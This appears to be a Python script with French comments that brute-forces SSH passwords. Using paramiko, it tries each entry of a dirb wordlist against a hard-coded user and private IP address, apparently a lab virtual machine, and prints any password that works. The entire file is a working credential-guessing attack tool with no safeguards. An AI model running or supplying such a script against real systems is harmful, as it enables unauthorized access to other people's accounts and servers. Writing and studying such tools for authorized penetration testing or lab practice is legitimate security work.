import paramiko
import os
import sys
from tqdm import tqdm

# Ajoute le répertoire 'Utiles' au chemin du système pour pouvoir importer des modules supplémentaires.
sys.path.append('./Utiles')
from utiles import clear_line, print_red  # Importe les fonctions clear_line et print_red du module 'utiles'.

def ssh_bruteforce(host, username):
    # Crée une instance de SSHClient avec Paramiko pour gérer les connexions SSH.
    ssh = paramiko.SSHClient()
    # Définit une politique qui ajoute automatiquement les clés de l'hôte non reconnu (ceci n'est pas sécurisé pour une production).
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Chemin vers le fichier de mots de passe utilisé pour la force brute.
    wordlist_path = "/usr/share/dirb/wordlists/small.txt" 
    # Ouvre le fichier des mots de passe en mode lecture.
    with open(wordlist_path, 'r', errors='ignore') as f:
        passwords = f.readlines()  # Lit toutes les lignes du fichier et les stocke dans la liste 'passwords'.

    total_passwords = len(passwords)  # Compte le nombre total de mots de passe.

    # Itère sur chaque mot de passe, en affichant une barre de progression avec tqdm.
    for password in tqdm(passwords, desc="Bruteforce SSH", unit="password"):
        password = password.strip()  # Enlève les espaces blancs autour du mot de passe.
        try:
            # Tente de se connecter au serveur SSH avec le nom d'utilisateur et le mot de passe.
            ssh.connect(host, username=username, password=password)
            print(f"Mot de passe trouvé : {password}")  # Affiche le mot de passe si la connexion est réussie.
            ssh.close()  # Ferme la connexion SSH.
            return True  # Retourne True pour indiquer que le mot de passe a été trouvé.
        except:
            pass  # Ignore les exceptions (généralement des échecs de connexion) et continue.

    # Si aucun mot de passe n'a fonctionné, affiche un message en rouge et retourne False.
    print_red("Échec de toutes les tentatives de connexion SSH.")
    return False

# Paramètres du serveur SSH cible.
host = '10.0.2.15'
username = 'yassir'
# Appelle la fonction de brute force SSH avec l'hôte et le nom d'utilisateur spécifiés.
ssh_bruteforce(host, username)
